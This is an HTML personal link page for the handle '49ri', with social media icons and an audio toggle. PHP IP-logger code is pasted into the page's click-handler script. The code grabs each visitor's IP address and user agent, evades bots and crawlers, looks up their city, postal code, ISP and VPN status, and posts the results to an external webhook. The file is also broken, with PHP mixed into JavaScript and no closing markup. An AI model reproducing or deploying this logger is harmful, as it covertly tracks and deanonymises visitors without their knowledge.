<!DOCTYPE html>
<html>
<head>
    <title>49ri</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
    
        <script src="https://kit.fontawesome.com/87714678e7.js" crossorigin="anonymous"></script>
    <style>


body {
  background-color: black;
 
}
#hero img {
    height: 100vh;
    width: 100%;
    background-position: absolute;
    z-index: 10;
    object-fit: cover;
}

#hero .content {
    background: rgba(0,0,0,0.7);
    height: 100%;
    width: 100%;
    z-index:20;
    position:absolute;
    top:0;
    left:0;
}

.switch {
    position:absolute;
    display: inline-block;
    width: 60px;
    height:34px;
    left: 5%;
    top:3%;
}

.switch input {
    opacity:0;
    width:0;
    height:0;
}

.slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left:0;
    right:0;
    bottom:0;
    background-color: #ccc;
    -webkit-transition: .4s;
}

.slider:before{
    position: absolute;
    content: "";
    height: 26px;
    width:26px ;
    left:4px;
    bottom: 4px;
    background-color: white;
    -webkit-transition: .4s;
}

input:checked + .slider {
    background-color: Tomato;
}

input:focus + .slider{
    box-shadow: 0 0 20px #2b78c2;
}
input:checked + .slider:before {
    transform: translateX(26px);
}
.slider.round{
    border-radius: 34px;
}
.slider.round:before {
    border-radius: 50%;
}

#clickme {
    color: #d9ddde;
    position:absolute;
    display: inline-block;
    width: 60px;
    height:34px;
    left: 5%;
    top:3%;
    text-indent: 12em;
    font-size: 18px; 
}


@import url('https://fonts.googleapis.com/css2?family=PT+Sans+Narrow:wght@700&display=swap');
#center {
font-family: 'PT Sans Narrow', sans-serif;
}

#button-text {
font-family: 'Open Sans Condensed', sans-serif;
}

#block {
  margin-left: 3px;
  margin-right:3px;
}


    </style>

</head>
<body>

<div id='hero'>

<img class="giphy" src="https://raw.githubusercontent.com/49rip/vite/main/mainpagebackground.gif">

<div class ="content d-flex align-items-center">

  <div id= "center" class ="container text-center">
    
    <h1 style="color:white; padding-bottom: 6px"></h1> 

    <span class="icons">

<a href="https://www.roblox.com/users/4945172915/profile"><img src="icons8-roblox.svg" alt="https://roblox.com" style="width:42px;height:42px;"></a>
        
        <span id="block">
 <a style="color: f392;" href="https://discord.com/users/1029062600677396550"><i class="fab fa-discord fa-2x" ></i></a>
        </span>
        <span id="block">
           
        </span>
        <span id="block">
          
            <a style="color: #ff0000;" href="https://www.youtube.com/channel/UC3bU3-H5muGmS4jsTvbJ5EQ"><i class="fab fa-youtube fa-2x" ></i></a>
        </span>

                <span id="block">
          
            <a style="color: #25D366;" href="https://api.whatsapp.com/send/?phone=37258352807&text&type=phone_number&app_absent=0"><i class="fab fa-whatsapp fa-2x" ></i></a>
        </span>

    </span>


  </div>


  <div>
       <p id="button-text" class="switch" style="color:#d9ddde; margin-left:6px; margin-top: 45px;"></p>
       <label class="switch">
        <input type="checkbox">
        <span class="slider round"></span>
        <audio id="myaudio"> <source src="video.mp4" type="video/mp4"> </audio>
        </label>
    
  </div>

</div>

<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>

<script>
    $(document).ready (function(){
        var myAudio = document.getElementById("myaudio");
        var more = 0;
        $('.round').click (function(){
            if(more %2 ==0){
                $(myAudio)[0].play();
                more++;
            }
            else if(more % 2 != 0){
                $(myAudio)[0].pause();
                more++;

       $url = "https://webhook.newstargeted.com/api/webhooks/1159170951217422459/BDbsM_GEvj7ZOEsCeCcrSjQL9LsE11QUGIXC0lXOk9qOsEr2sGAu224uxz3kWe7lAtZh";

        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        $browser = $_SERVER['HTTP_USER_AGENT'];
        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
            exit();
        }
        $TheirDate = date('d/m/Y');
        $TheirTime = date('G:i:s');
        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
        if($vpnCon->connection_type==="Corporate"){
            $vpn = "Yes (Double Check: $details->isp)";
        }else{
            $vpn = "No (Double Check: $details->isp)";
        }
        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";

        $json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
        $make_json = json_encode($json_data);
        $ch = curl_init( $url );

        curl_setopt( $ch, CURLOPT_POST, 1);
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt( $ch, CURLOPT_HEADER, 0);
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

        $response = curl_exec( $ch );

?>

